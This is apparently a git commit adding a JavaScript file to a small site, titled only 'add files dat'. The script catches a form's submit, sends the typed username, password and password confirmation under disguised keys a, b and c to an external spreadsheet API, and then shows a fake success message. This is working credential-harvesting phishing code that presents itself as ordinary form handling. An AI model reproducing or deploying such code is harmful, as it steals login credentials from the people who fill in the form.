f1498883ded86f89c4382eaa15fa290f89f1a1cd
ss-soporte <rronromo@gmail.com>
2025-01-16 07:16:22 -0600

    add files dat

---
+++ santa/js/1820sa.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/d5e62daa-70e7-4748-b896-54829980080b', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "a": formulario.usuario.value,
+            "b": formulario.contraseña.value,
+            "c": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
